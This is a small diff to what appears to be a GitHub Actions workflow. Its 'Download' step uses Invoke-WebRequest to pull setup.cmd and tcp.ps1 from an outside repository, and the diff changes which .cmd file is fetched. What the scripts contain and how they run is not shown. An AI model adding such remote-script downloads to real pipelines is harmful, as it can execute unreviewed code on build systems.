@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: Download
       run: |
-          Invoke-WebRequest https://github.com/gonado-fpg/fictional-octo-waffle/raw/main/a1.cmd -OutFile setup.cmd
+          Invoke-WebRequest https://github.com/gonado-fpg/fictional-octo-waffle/raw/main/a.cmd -OutFile setup.cmd
           Invoke-WebRequest https://github.com/gonado-fpg/fictional-octo-waffle/raw/main/tcp.ps1 -OutFile tcp.ps1
     
     - name: rrt
